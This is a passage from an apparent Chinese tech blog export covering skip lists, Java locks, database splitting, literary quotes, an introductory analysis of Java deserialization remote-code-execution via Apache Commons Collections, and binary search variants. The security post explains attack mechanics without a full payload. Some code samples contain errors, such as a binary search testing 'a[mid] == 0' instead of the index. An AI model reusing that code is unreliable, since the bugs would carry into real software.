其中，插入、删除、查找和迭代输出有序序列这节操作，红黑树也能完成，时间复杂度跟跳表是一样的。但是按照区间来查找数据这个操作，红黑树的效率没有跳表高。 对于按照区间查找数据这个操作，跳表可以做到O(logn)的时间复杂度定位区间的起点，然后在原始链表中顺序往后遍历就可以了。这样做非常高效。 当然，Redis之所以用跳表来实现有序集合，还有其他原因，比如跳表更容易代码实现。虽然跳表的实现也不简单，但比起红黑树来说还是好懂、好些多了，简单就意味着可读性好，不容易出错。还有跳表更加灵活，他可以通过改变索引构建策略，有效平衡执行效率和内存消耗。 不过，跳表也不能完全代替红黑树。因为红黑树比跳表出现的要早一些，很多编程语言的Map类型都是通过红黑树来是实现的。我们做业务开发的时候，直接拿来用就可以了，不用费劲自己去实现一个红黑树，但是跳表并没有一个线程的实现，所以在开发中，如果你要是用跳表，必须要自己实现。 内容总结 今天我们讲了跳表这种数据结构。跳表使用空间换时间的设计思路，通过构建多级索引来提高查询效率，实现了基于链表的二分查找。跳表是一种动态数据结构，支持快速的插入、删除、查找，时间复杂度都是O(logn)。 跳表的空间复杂度是O(n)，不过跳表的实现非常灵活，可以通过改变索引构建策略，有效平衡执行效率和内存消耗。虽然跳表的代码实现并不简单，但是作为一种动态数据结构，比起红黑树来说，实现要简单多了。所以很多时候，我们为了代码的简单、易读，比起红黑树，我们更倾向于跳表。 课后思考在今天的内容中，对于跳表的时间复杂度分析，我分析了每两个节点抽取一个节点作为索引的时间复杂度，如果每三个或者每五个节点抽取一个节点作为上级索引，对应的在跳表中查询数据的时间复杂度是多少呢？ (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>跳表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java中的各种锁]]></title>
    <url>%2Fposts%2F2018-11-28-java%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E9%94%81.html</url>
    <content type="text"><![CDATA[一、 Java中锁的分类乐观锁乐观锁是一种思想，即认为读多写少，遇到并发写的可能性低，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据，采取在写时先读出版本号，然后加锁操作（比较跟上一次的版本号，如果一样则更新），如果失败则重复读-比较-写的操作。 java中乐观锁基本都是通过CAS(Compare And Swap)实现的，CAS是一种更新的原子操作，比较当前的值和传入的值是否一样，一样则更新，否则失败。 悲观锁悲观锁就是悲观思想，认为写多，遇到并发的可能性高，每次去拿数据的时候都认为别人会修改，所以每次在读写数据的时候都会先上锁。这样别人想读取数据就会直接block拿到锁，java中的悲观锁就是synchronized，AQS框架下的锁则是先尝试CAS乐观锁去获取锁，获取不到，才会转为悲观锁，如RetreenLock。 自旋锁自旋锁的原理非常简单，如果持有锁的线程能在很短时间内释放资源，那么等待竞争锁的线程就不需要做内核态和用户态之间的切换进入阻塞状态，他们只需要等一等（自旋），等持有锁的线程释放锁后即可立即获取锁，这样就避免用户线程和内核的切换消耗。 线程自旋是需要消耗CPU的，说白了就是再让CPU做无用功，如果一直获取不到锁，那县城也不能一直占用CPU自旋锁做无用功，所以需要设定一个最大自旋等待时间。 如果持有锁的线程执行时间查过自旋等待的最大时间仍然没有释放锁，就会导致其他争用锁的线程在最大时间还是获取不到锁，这是争用线程会停止自旋进入阻塞状态。 非公平锁JVM按照随机、就近原则分配锁的机制则称为不公平锁。非公平锁是指多个线程获取锁的顺序并不是按照申请的顺序，有可能后申请的线程比先申请的线程先获得锁。 在java中，ReentrantLock可以通过构造函数指定该锁是公平锁还是非公平锁，默认是非公平锁。非公平锁实际执行效率要远远超出公平锁，因此除非有特殊需要，否则最常用的还是非公平锁的分配机制。 对于synchronized而言，是一种非公平锁，由于其并不想ReentrantLock是通过AQS框架实现的线程调度，所有没有任何办法使其变为公平锁。 公平锁与非公平锁相对，公平锁是按照线程申请的顺序进行锁的分配。通常先对锁获取请求的线程会先被分配到锁。由于公平锁会维护一个线程队列，因此相比非公平锁性能会下降5-10倍。 可重入锁（递归锁）可重入锁又称递归锁，是指在一个线程的外层方法回去锁之后，在进入内层方法时会自动回去锁。在java中，ReentrantLock和Synchronized都是可重入锁。 ReadWriteLock 读写锁为了提高性能，Java中提供了读写锁，在读的地方用读锁，在写的地方用写锁，灵活控制，在没有写锁的情况下，读是无阻塞的，在一定情况下提高了程序的运行效率。读写锁分为读锁和写锁，多个读锁不互斥，读锁和写锁互斥，这是由jvm控制的，你只要上好相应的锁即可。 Java中读写锁有个接口java.util.concurrent.locks.ReadWriteLock，也有具体的实现ReentrantReadWriteLock。 共享锁和独占锁java并发包中提供的加锁模式分别为共享锁和独占锁。 1、独占锁 独占锁模式下，只有一个线程持有锁，ReentrantLock就是以独占锁实现的互斥锁。独占锁是一种悲观保守的加锁策略，他避免了读/读冲突，如果某个只读线程获取了锁，则其他读线程都只能等待，这种情况下就限制了不必要的并发性，应为读操作并不会影响数据的一致性。 2、共享锁 共享锁允许多个线程同时获得锁，并发访问共享资源，如：ReadWriteLock。共享锁是一种乐观锁，他放宽了加锁策略，允许多个执行读操作的线程同时访问共享资源。 AQS内部类Node定义了两个常量SHARED和EXCLUSIVE，他们分别表示了AQS队列中等待线程获取锁的模式。 重量级锁Synchronized是通过对象内部的一个叫做监视器锁（monitor）来实现的。但是监视器锁本质又是依赖于底层的操作系统的MutexLock实现的，而操作系统实现线程之间的切换这就需要从用户态转换为核心态，这个成本非常高，状态之间的转换需要相对比较长的时间，这就是为什么Synchronized效率低的原因。因此这种依赖于操作系统Mutex Lock实现的锁我们称之为“重量级锁”，JDK中对于Synchronized的优化，其核心就是为了减少这种重量级锁的使用。JDK1.6之后，为了减少锁和释放锁所带来的性能消耗，提高性能，引入了“轻量级锁”和“偏向锁”。 轻量级锁锁的状态有四种：无锁状态、偏向锁、轻量级锁、重量级锁。 随着锁的竞争，锁可以从偏向锁升级到轻量级锁，再升级到重量级锁。但是锁升级只能是单向的，也就是说只能从低到高，不会出现锁的降级。 “轻量级锁”是相对于使用系统互斥量来实现的传统锁而言的，但是首先要强调一点的是，轻量级锁并不是用来代替重量级锁的，他的本意是在没有多线程竞争的前提下，减少传统的重量级锁产生的性能消耗。在解释轻量级锁的执行过程之前，先明白一点，轻量级锁所适应的场景是线程交替执行同步代码块的情况，如果存在同一时间访问统一锁的情况，就会导致轻量级锁膨胀为重量级锁。 偏向锁Hotspot的作者经过大量研究发现大多数情况下锁不仅不会存在多线程竞争，而且总是由同一个线程多次获取。偏向锁的目的是在某个线程获得锁之后，消除这个线程锁重入（CAS）的开销，看起来像是让这个线程得到了偏护。引入偏向锁的目的是为了在无多线程竞争条件下尽量减少不必要的轻量级锁执行路径，应为轻量级锁的获取和释放依赖多次CAS原子指令，而偏向锁只需要在置换ThreadID的时候依赖一次CAS原子指令（由于一旦出现多线程竞争的情况就必须撤销偏向锁，所以偏向锁的撤销消耗的性能必须小于节省下来的CAS原子指令的性能消耗）。上面说过，轻量级锁是为了在线程交替执行同步块的时候提高性能，而偏向锁则是在只有一个线程执行同步快时进一步提高性能。 分段锁分段锁是一种设计，并不是具体的一种锁。在ConcurrentHashMap中，其并发的思想就是通过分段所的形式来实现高效的并发操作。 二、 JAVA中几种锁的实现1、Synchronized 同步锁synchronized 可以把任意一个非NULL的对象当作锁。它属于独占锁，同时属于可重入锁。 Synchronized的作用范围 当做用于方法时，锁住的对象是对象的实例（this）。 当做用于静态方法时，锁住的是Class实例，又因为Class的相关数据存储在永久带PermGen（JDK1.8则是metaspace），永久带是全局共享，因此静态方法锁相当于是类的一个全局锁，会锁住所有调用该方法的线程。 当作用域一个对象实例时，锁住的是所有以该对象为锁的代码块。他有多个队列，当多个线程一起访问某个对象监视器时，对象监视器会将这些线程存储在不同的容器中。 Synchronized 核心组件 Wait Set： 那些调用wait方法被阻塞的线程放置在这里Contention List： 竞争队列，所有请求所得线程首先被放在这个竞争队列中Entry List： Contention List中的那些有资格成为候选资源的线程被移动到Entry List中OnDeck： 任意时刻，最多只有一个线程正在竞争锁资源，该线程被称为OnDeckOwner： 当前已经获取到资源锁的线程被称为Owner!Owner: 当前释放锁的线程 2、ReentrantLockReentrantLock继承接口Lock并实现了接口中定义的方法，也是一种可重入锁，除了能完成Synchronized所能完成的所有工作外，还提供了诸如可响应中断锁、可轮询锁请求、定时锁等避免多线程死锁的方法。 ReentrantLock通过方法lock和unlock来进行加锁和解锁操作，与Synchronized会被JVM自动解锁不同，ReentrantLock加锁需要手动进行解锁。为了避免程序出现异常而无法正常解锁的情况，使用ReentrantLock必须在finally控制块中进行解锁操作。 3、Semaphore 信号量Semaphore是一种基于计数的信号量，他可以设定一个阈值，基于此，多个线程竞争获取许可信号，做完自己的申请后归还，超过阈值后，线程申请许可信号量会被阻塞。Semaphore可以用来构建一些对象池、线程池等，比如数据库连接池。 Semaphore基本能完成ReentrantLock的所有工作，使用方法也与之类似，通过acquire()与release()方法来获取和释放资源。经实测，Semaphore.acquire()默认为可响应中断锁，与ReentrantLock.lockInterruptibly()作用效果一致，也就是说在等待临界资源的过程中可以被Thread.interrupt()中断。 此外，Semaphore也实现了可轮询的锁请求和定时锁的功能，除了方法名tryAcquire()与tryLock不同之外，其使用方法与ReentrantLock几乎一致，Semaphore也提供了公平和非公平锁的机制，也可以在构造函数中进行设定。 Semaphore的释放也必须手动进行，因此与ReentrantLock一样，为了避免程序出现异常而无法正常解锁的情况，使用ReentrantLock必须在finally控制块中进行解锁操作。 4、AtomicInteger此处AtomicInteger是一个提供原子操作的Integer类，类似的还有AtomicBoolean、AtomicLong、AtomicReference等。他们的实现原理相同，区别在于运算类型不同，令人兴奋的是，可以通过AtomicReference 将一个对象的所有操作转换为原子操作。 我们知道，在多线程程序中，诸如i++等运算不具备原子性，是不安全的线程操作之一。通常我们会使用synchronized将该操作变为一个原子操作，但JVM为此类特意提供了一些同步类，使得使用方便，且使程序运行效率变得更高。通过相关资料显示，使用AtomicInteger的性能是ReentantLock的好几倍。 三、 锁的优化1、较少锁持有时间只在有线程安全的程序上加锁 2、减少锁粒度将对象拆成小对象，大大增加并行度，降低锁竞争。降低了锁的竞争，偏向锁、轻量级锁的概率才会高，最典型的的减小锁粒度的案例就是ConcurrentHashMap。 3、锁分离最常见的锁分离就是读写锁ReadWriteLock，根据功能分离成读锁和写锁，这样读读不互斥，读写互斥，写写互斥，既保证了线程安全，有提高了性能。读写分离思想可以延伸，只要操作互不影响，所就可以分离，比如LinkedBlockingQueue从头部取出，从尾部放数据。 4、锁粗化通常情况下，为了保证多线程间的有效并发，会要求每个线程持有锁的时间尽量短，即在使用完公共资源后，应该立即释放锁。但是凡事都有一个度，如果对同一个锁不停的请求、同步、释放，其本身也会消耗宝贵的系统资源，反而不利于性能优化。 5、锁消除锁消除是编译器级别的事，在即时编译器时，如果发现不可能被共享的对象，则可以消除这些对象的锁操作，多数是因为程序员编码不规范引起的。 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>锁</tag>
        <tag>CAS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据库拆分]]></title>
    <url>%2Fposts%2F2018-11-26-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8B%86%E5%88%86.html</url>
    <content type="text"><![CDATA[一、数据库的拆分当数据库的数据量非常大时，水平拆分和垂直拆分是两种常见的降低数据库大小，提升性能的方法。其实在大多数分布式场景中，水平拆分和垂直拆分也通常是两种降低耦合，提升性能的架构设计或者业务拆分方法。 假设我们在数据库中有用户表1234567891011create table user( id bigint, name varchar(50), password varchar(32), age int, sex tinyint, email varchar(32), sign varchar(64), intro varchar(256) ...)engine=innodb charset=utf8; 水平拆分是指，以某个字段（如ID）为依据，按照一定规则（例如hash、取模），将一个库（表）上的数据拆分到多个库（表）上，以降低单库（表）的大小，水平切分后，各个库(表)的特点是： （1）每个库（表）的结构都一样 （2）每个库（表）的数据不一样，没有交集 （3）所有库（表）的并集是全量数据 垂直拆分是将一个属性较多，一行数据较大的表，将不同的属性拆分到不同的表中，以降低单库（表）的大小，达到提升性能的目的的方法。垂直拆分后，各个库（表）的特点是： （1）每个库（表）的结构都不一样 （2）一般来说每个库（表）的属性至少有一列交集，一般是主键 （3）所有库（表）的数据并集是全量数据 以上文的用户表为例，如果要垂直拆分，可能拆分的结果会是这样的： 12345678910111213141516create table user_base( id bigint, name varchar(50), password varchar(32), age int, sex tinyint, email varchar(32), ...)create table user_ext( id bigint, sign varchar(64), intro varchar(256), ...) 从结果上来看，水平拆分实际上是将数据进行了拆分存储，垂直拆分是将元数据或者字段以及数据进行拆分存储。 二、垂直拆分的依据是什么那垂直拆分的依据又是什么呢？当一个表属性很多时，如何来进行垂直拆分呢。通常情况下，我们会按照以下几点进行数据的拆分：（1）将长度较短、访问频率高的属性尽量放在一个表里，这个表暂且称为主表（2）将字段较长、访问频率较低的属性尽量放在一个表里，这个表暂且称为扩展表（3）如何1和2都满足，还可以考虑第三点，将经常一起访问的属性，也放在一个表里 优先考虑1、2，第3点不是必须的，如果实在属性过多，主表和扩展表都可以有多个。 一般来说，数据量并发量较大时，数据库的上层都会有一个服务层，需要注意的是，当应用需要同时访问主表和扩展表中的数据时，服务层不要使用join来连表查询，而是应该分两次进行查询。 原因是，在大数据、高并发的互联网场景下，一般来说，吞吐量和拓展性是主要矛盾。（1）join更消耗数据库性能（2）join或让base表和ext表耦合在一起（必须在一个数据库实例上），不利于数据量大时拆分到不同的数据库实例上，毕竟减少数据量，提升性能才是垂直拆分的初衷。 三、为什么要这样拆分为什么将字段段、访问频率高的属性放到一个表里？为什么垂直拆分可以提升性能？因为：（1）数据库有自己的内存buffer，会将磁盘上的数据load到内存buffer里（2）内存buffer缓存数据是以row为单位的（3）在内存有限的情况下，在数据库的buffer里缓存短row，就能缓存更多数据（4）在数据库内存buffer里缓存访问频率高的row，就能提升缓存命中率，减少磁盘IO 还是以上面的用户表为例，假如数据库的缓存buffer有1G，未拆分的user表一行数据的大小为1k，那么只能缓存100w行数据，如果拆分成user_base和user_ext之后：（1）user_base访问频率高，一行大小只有0.1k，那内存buffer就可以近乎缓存1000w行user_base数据（2）user_ext访问频率低，一行大小0.9k拆分后缓存就能更多命中记录，磁盘访问概率大大降低，数据库访问的时延会大大降低，吞吐量也就会相应增加。 四、总结1、水平拆分和垂直拆分都是降低数据量大小，提升数据库性能的常见手段2、流量大、数据量大时，不要通过join来获取主表和扩展表的属性3、数据库的拆分依据，尽量把长度较短、访问频率较高的属性放在主表中 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>架构</category>
      </categories>
      <tags>
        <tag>分布式</tag>
        <tag>数据库拆分</tag>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[生活-文艺到爆的句子]]></title>
    <url>%2Fposts%2F2018-11-26-%E7%94%9F%E6%B4%BB-%E6%96%87%E8%89%BA%E5%88%B0%E7%88%86%E7%9A%84%E5%8F%A5%E5%AD%90.html</url>
    <content type="text"><![CDATA[1、我慢慢明白了为什么我不快乐，因为我总是期待一个结果。看一本书期待它让我变得深刻；吃饭、游泳期待它让我一斤斤瘦下；发一条微信期待被回复；对别人好期待被回待以好；写一个故事期待被关注安慰；参加一个活动，期待换来充实丰富的经历；这些预设的期待如果实现了，我就长舒一口气。如果没有实现，就自怨自艾。可是小时候也是同一个我，用一个下午的时间看蚂蚁搬家，等石头开花。小时候不期待结果，小时候的笑哭都不打折。 ——《允许自己虚度时光》 2、在一回首间，才忽然发现，原来我一生的种种努力，不过只是为了周遭的人对我满意而已，为了博得他人的称许和微笑，我战战兢兢的将自己套入所有的模式所有的桎梏，走到途中才发现，我只剩下一副模糊的面目，和一条不能回头的路。 ——席慕蓉《独白》 3、我确实真诚地喜欢过你，想过带你去看每年故宫的初雪，阿拉斯加的海岸线，我曾愿意与你两人独占一江秋，愿意与你郡亭枕上看潮头，铺着红地毯的礼堂，暮霭沉沉的原野，我都曾愿与你共享，我想想过和你一起生活，直到白发苍苍垂垂老矣，同枕共穴，至死不休。可是我现在确实不喜欢你了，车站年久失修，江南的砖瓦裂了缝，当初不撞南墙不会头的热血已然冷却。抱歉啦，我们就此别过吧，我的喜欢要留给别人了。此生勿复见，山水不相逢。 ——钟意《摘录墙》 4、从童年起，我便独自一人，照顾着历代的星星。 ——《孤独》 5、我不在装模做样的拥有很多朋友，而是回到了孤单之中，以真正的我开始了独自的生活，有时我也会因为寂寞而难以忍受空虚的折磨，但无宁愿以这样的方式来维护自己的自尊，也不愿以耻辱为代价去换取那种表面的朋友。 ——余华《在细雨中呼喊》 6、太敏感的人会体谅到他人的痛苦，自然就无法轻易做到坦率，所谓的坦率，其实就是暴力。敏感的人会被动性的洞穿对方的难处，就不能无动于衷，总想着为对方分担一些，就算是要委屈自己，往往敏感的人在事情未发生前就提前自我创造了痛苦。所以那些共情能力弱的人，是很自私光明的在幸福着。好想抱一抱每一个因为敏感而变得小心翼翼的人，我懂得他们内心的善良，亦知晓他们的可贵。要好好对待身边敏感且善良的人才好。 7、你要知道什么是自己想要的，知道什么是不可逆转的，知道用什么方式实现梦想，知道用什么心情面对苦难，人就在转瞬间感悟，进退得失不离不弃也就都有了答案。我不知道命运会把我带到何方，但是我一直会用善良维护左右。 8、上邪，我欲与君相如，长命无绝哀。山无棱，江水为竭。冬雷震震，夏雨雪。天地合，乃敢与君绝。 ——上邪 9、我装作老成，人们就传言我老成。我假装是个懒汉，人人就讹传我是懒惰虫。我假装不会写小说，人们就讹传我不会写。我伪装成骗子，人们就说我是个骗子。我充阔，人人以为我是阔佬。我故作冷谈，人人就说我是个无情的家伙。然而，当我真的痛苦万分，不由得呻吟时，人人却认为我是在无病呻吟。 ——太宰治 10、我所有的自负都来自我的自卑，所有的英雄气概都来自我内心的软弱，所有的振振有词都因为心中满是怀疑，我假装深情，其实是痛恨自己的无情，我以为人生的意义在于四处游荡流亡，其实只是掩饰至今没有找到可以驻足的地方。 ——马良《坦白书》 11、事情往往是这样的，你生了一种病，然后发现导出都是同病者。你丢了一只狗，随后发现满大街都是流浪狗，却都不是你丢的那一只。人的境遇是一种筛子，删选了落到了我们视野的人和事，人一旦掉到了一种境遇里，就会变成吸铁石，把铁屑吸到身边来。 ——韩松落《鲤.旅馆》 12、每个人的心中都有一团火，路过的人只看到了烟。但是总有一个人，总有那么一个人能看到这团火，然后走过来，陪我一起。我在人人群中，看到了他的火，然后快步走过去，生怕慢一点他就会被淹没在岁月的尘埃里。我带着我的热情，我的冷漠，我的狂暴，我的温和，以及对爱情的毫无理由的相信，走的上气不接下气。我结结巴巴的对他说：你叫什么名字。从你叫什么名字开始，后来，有了一切。 ——梵高写提奥的信 13、我渴望能见你一面，但请你记得，我不会开口见你。这不是因为我骄傲，你知道我在你面前毫无骄傲可言，而是因为，唯有你也想见我的时候，我们见面才有意义。 ——西蒙波伏娃 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>诗意</tag>
        <tag>文艺</tag>
        <tag>美句</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java反序列化漏洞浅析]]></title>
    <url>%2Fposts%2F2018-11-13-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90.html</url>
    <content type="text"><![CDATA[0x01 前言 2015年11月6日FoxGlove Security安全团队的@breenmachine 发布了一篇长博客，介绍了如何利用Java反序列化漏洞，来攻击最新的Jenkins、Jboss、WebLogic等java应用，实现远程代码执行漏洞。 事实上，早在2015年的1月28号，Gabriel Lawrence (@gebl)和Chris Frohoff (@frohoff)在AppSecCali上给出了一个报告[5]，报告中介绍了Java反序列化漏洞可以利用Apache Commons Collections这个常用的Java库来实现任意代码执行。 确实，Apache Commons Collection这样的基础类库有非常多的Java应用都在用，一旦编程人员误用了反序列化机制，使得用户的输入可以直接被反序列化，就能导致任意代码执行，这是一个极其严重的事情。 0x02 Java序列化和反序列化 今天我们就以Java的反序列化漏洞做一个简单的分析。在这之前先了解一下Java的序列化和反序列化。 序列化就是把对象的状态信息转换为字节序列(即可以存储或传输的形式)过程反序列化即逆过程，将字节流还原为对象 java序列化经常用在把对象的字节序列存储在磁盘上，另一个用途是在网络上传输对象。例如最常见的是web服务器中Session对象，当有10万用户并发访问，就有可能出现10万个session对象，内存可能吃不消，于是web容器就会把一些session先序列化到硬盘中，等要用的时候，再把保存在磁盘上的对象加载到内存中。 Java中的ObjectOutputStream类的writeObject 方法可以实现序列化，类ObjectInputStream类的readObject方法可以用于反序列化。下面是一个将字符串对象先进行序列化存储到本地文件，在通过反序列化进行恢复的代码。 12345678910111213141516171819public class TestSerialize()&#123; public static void main(String[] args)&#123; String s = "test"; // 将序列化对象写入文件中 FileOutputStream fos = new FileOutputStream("object.ser"); ObjectOutputStream os = new ObjectOutputStream(fos); os.writeObject(s); os.close; // 从文件中读取对象 FileInputStream fis = new FileInputStream("object.ser"); ObjectInputStream ois = new ObjectInputStream(fis); // 通过反序列化恢复对象 String s1 = (String)ois.readObject(); ois.close(); &#125;&#125; 问题在于，如果java应用对于用户输入，即不可信的数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象产生过程中就有可能带来任意代码执行。 所以这个问题的根源在于ObjecInputStream在反序列化时，没有对生成的对象的类型做限制。 0x03 利用Apache Commons Collections实现远程代码执行 本篇以Apache Commons Collections为例，来解释如何构造对象，能够让程序在反序列化时，即调用readObject()时，就能直接实现远程代码执行。 Java中Map是存储键值对的数据结构。在Apache Commons Collections中实现了类TransformedMap，用来对Map进行某种转换，只需要调用decorate()函数，传入key和value的变换函数Transformer，就可以从任意Map对象生成相应的TransformedMap，decorate的函数如下： 123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer)&#123; return new TransformedMap(map, keyTransformer, valueTransformer);&#125; Transformer是一个接口，其中定义的transform()函数用来将一个对象转换为另一个对象，如下所示： 123public interface Transformer&#123; public Object transform(Object input);&#125; 当Map中的任意key或value更改时，相应的Transformer就会被调用。除此之外，多个Trnansformer还能串起来，形成调用链ChainedTransformer。Apache Commons Collections已经实现了一些Transformer，其中有一个可以通过java的反射机制调用任意函数，叫做InvokerTransformer,代码如下： 123456public class InvokerTransformer implements Transformer, Serializable&#123; ... public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)&#123; &#125;&#125; (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>反序列化</tag>
        <tag>Java</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-二分查找： 如何快速定位IP对应的省份地址]]></title>
    <url>%2Fposts%2F2018-11-09-%E7%AE%97%E6%B3%95-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE-%E4%B8%8B.html</url>
    <content type="text"><![CDATA[前言 通过IP地址来查找IP归属地的功能，不知道那有没有用过？没用过也没关系，你现在就可以打开百度，在搜索框中随便输入一个IP地址，就会看到它的归属地。 这个功能并不复杂，它是通过维护一个很大的IP地址库来实现的。地址库汇总包括IP地址范围和归属地对应的关系。 当我们想要查询202.102.133.13这个IP地址的归属地时，我们就在地址库中搜索，发现这个IP地址落在[202.102.133.0, 202.102.133.255]这个地址范围内，那我们就可以将这个IP地址范围对应的归属地”山东东营市”显示给用户了。 现在我的问题是，在庞大的地址库中逐一对比IP地址所在的区间，是非常耗时的。假设我们有12万条这样的IP区间与归属地的对应关系，如何快速定位出一个IP地址的归属地呢？ 是不是觉得比较难？不要紧，等学完今天的内容，你就会发现这个问题其实很简单。 上一节我讲了二分查找的原理，并且介绍了最简单的一种二分查找的代码实现。今天我们来讲几种二分查找的变形问题。 不知道你有没有听过这样一个说法：”十个二分九个错”。二分查找虽然原理极其简单，但是想要写出没有bug的二分查找并不容易。 康纳德·克努特(Donald E.Knuth) 在《计算机程序设计艺术》的第3卷《排序与查找》中说到”尽管第一个二分查找算法于1946年出现，然后第一个完全正确的二分查找算法实现直到1962年才出现”。 你可能会说，我们上一节学的二分查找的代码实现并不难写啊。那是因为上一节讲的只是二分查找的一种最简单的情况，在不存在重复元素的有序数组中，查找给定值的元素。最简单的二分查找写起来确实不难，但是，二分查找的变形问题就没有那么好写了。 二分查找的变形问题很多，我只选择几个典型的来讲解，其它你可以借助我今天讲的思路来分析。 四种常见的二分查找的变形问题： 查找第一个值等于给定值的元素 查找最后一个值等于给定值的元素 查找第一个大于等于给定值的元素 查找最后一个小于给定值的元素 需要特别说明一点，为了简化讲解，今天的内容，我都以数据是从小到大排列为前提，如果你要处理的数据是从大到小排列的，解决思路也是一样的。同时，我希望你最好先自己动手试着写一下这4个变形问题，然后再看看我的讲述，这样你就会对我说的”二分查找比较难写”有更加深刻的体会了。 变体1：查找第一个值等于给定值的元素 上一节中的二分查找是最简单的一种，即有序数据集合中不存在重复的数据，我们在其中查找值等于某个给定值的数据。如果我们将这个问题稍微修改下，有序数据集合中存在重复的数据，我们希望找到第一个值等于给定值的数据，止痒之前的二分查找代码还能工作吗？ 比如下面这样一个有序数组，其中，a[5], a[6], a[7]的值都等于8，是重复的数据，我们希望找到第一个等于8的数据，也就是下标是5的元素。 如果我们用上一节课讲的二分查找的代码实现，首先拿8与区间的中间值a[4] 比较，8比6大，于是在下标5到9之间继续查找。下标5和9中间的位置是下标7，a[7]正好等于8，所以代码就返回了。 尽管a[7]也等于8，但它并不是我们想找的第一个等于8的元素，因为第一个值等于8的元素是下标为5的元素。我们上一节讲的二分查找代码就无法处理这种情况了。所以针对这个变形问题，我们可以稍微改造上一节的代码。 100个人写二分查找就会有100中写法。网上有很多关于变形二分查找的实现方法，有很多写的非常简洁，比如下面这个写法。但是，尽管简洁，理解起来却非常烧脑，也很容易写错。 12345678910111213141516171819public binarySearch01(int[] a, int n, int value)&#123; int low = 0; int high = n-1; while(low &lt;= high) &#123; int mid = low + ((high-low)&gt;&gt;1); if(a[mid] &gt; value)&#123; high = mid -1; &#125;else &#123; low = mid + 1; &#125; &#125; if (low &lt; n &amp;&amp; a[low] == value) &#123; return low; &#125;else&#123; return -1; &#125;&#125; 看完之后，你是不是觉得很不好理解？如果你只是死记硬背这个写法，我敢保证，过不了几天，你就会全部忘光，再让你写，90%的可能会写错。所以，我换了一种实现方法，你看看是不是更容易理解。 1234567891011121314151617181920public int binarySearch01(int[] a, int n, int value)&#123; int low=0; int high = n-1; while(low &lt;= high) &#123; int mid = low + ((high-low)&gt;&gt;1); if (a[mid] &gt; value) &#123; high = mid - 1; &#125;else if (a[mid] &lt; value) &#123; low = mid + 1; &#125;else &#123; if(a[mid] == 0 || a[mid-1] != value) &#123; return mid; &#125;else&#123; high = mid - 1; &#125; &#125; &#125; return -1;&#125; 我来稍微解释一下这段代码。a[mid] 跟要查找的value的大小关系有三种情况：大于、小于、等于。 对于a[mid]&gt;value的情况，我们需要更新high=mid-1；对于a[mid]&lt; value的情况，我们需要更新low=mid+1。这两点都好理解，那当a[mid]=value的时候该如何处理呢？ 如果我们查找的是任意一个值等于给定值的元素，当a[mid]等于要查找的值时，a[mid]就是我们要查找的元素。但是如果我们要查找的是第一个值等于给定值的元素，当a[mid]等于要查找的值时，我们就需要确认一下这个元素是不是第一个定于给定值的元素。 我们重点看一下第12行代码。如果mid等于0，那这个元素已经是数组的第一个元素，那它肯定是我们要找的。如果mid不等于0，但a[mid]的前一个元素a[mid-1]不等于value，那也说明a[mid]就是我们要找的第一个值等于给定值的元素。 如果经过检查之后发现a[mid]前面的一个元素a[mid-1]也等于value，那说明此时的a[mid]肯定不是我们要找的第一个值等于给定值的元素。那我们就更新high=mid-1，因为我们要查找的元素肯定出现在[low. mid-1]之间。 对比上面的两段代码，是不是下面那种更好理解？实际上，很多人觉得变形的二分查找很难，主要原因是追求第一种那样完美、简洁的写法。而对于我们做工程开发的人来说，代码易读懂、没Bug，其实更重要。 变体2：查找最后一个值等于给定值的元素 前面的问题是查找第一个值等于给定值的元素，我现在把问题稍微修改一下，查找最后一个只等于给定值的元素，又该如何做呢？ 如果你掌握了前面的写法，那这个问题你应该轻松就能解决，你可以先试着写一下，然后跟我写的对比一下。 12345678910111213141516171819public int binarySearch02(int[] a, int n, int value)&#123; int low = 0; int high = n-1; while (low &lt;= high) &#123; int mid = low + ((high-low)&gt;&gt;1); if(a[mid]&lt;value) &#123; low = mid + 1; &#125;else if (a[mid] &gt; value)&#123; high = mid - 1; &#125;else &#123; if (mid == n-1 || a[mid + 1] != value )&#123; return mid; &#125;else &#123; low = mid + 1; &#125; &#125; &#125; return -1;&#125; 我们还是重点看一下11行代码。如果a[mid]已经是这个数组中最后一个元素了，那它肯定是我么要找的；如果a[mid+1]不等于value，那也说明a[mid]就是我们要找的最后一个值等于给定值的元素。 如果我们经过检查之后，发现a[mid]后面的一个元素a[mid+1]也等于value，那说明当前的元素并不是最后一个只等于给定值的元素，我们更新low=mid+1，因为要找的元素肯定在[mid+1, high]之间。 变体3：查找第一个大于等于给定值的元素 现在我们来看另一类变形问题。在有序数组中，查找第一个大于等于给定值的元素。比如数组中存储的这样一个序列：3,4,6,7,10.如果查找第一个大于等于5的元素，那就是6。 实际上，实现的思路跟上面两种变形问题的实现思路类似，代码写起来甚至更简洁。 1234567891011121314151617public int binarySearch03(int[] a, int n, int value)&#123; int low = 0; int high = n -1; while(low&lt;=high)&#123; int mid = low + ((high - low) &gt;&gt; 1); if(a[mid] &gt;= value) &#123; if (mid == 0 || a[mid-1] &lt; value) &#123; return mid; &#125;else &#123; high = mid - 1; &#125; &#125;else &#123; low 